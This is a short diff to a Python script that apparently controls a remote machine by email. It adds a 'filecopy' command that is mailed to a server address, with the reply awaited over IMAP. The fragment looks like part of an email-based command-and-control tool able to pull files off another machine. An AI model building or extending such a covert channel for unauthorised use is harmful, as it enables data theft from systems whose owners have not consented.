@@ -73,6 +73,13 @@ if __name__ == '__main__':
                 mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                 threading.Thread(target=imap.await_response, daemon=True, args=(SERVER_MAIL, cmd, 30,)).start()
 
+            elif inp.startswith('filecopy'):
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:8] + ' ' + id + inp[8:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(SERVER_MAIL, cmd, 30,)).start()
+
+
     except KeyboardInterrupt:
         print('Ctrl C pressed')
         utils.remove_files(DATA_FOLDER, ends_with='.jpg')
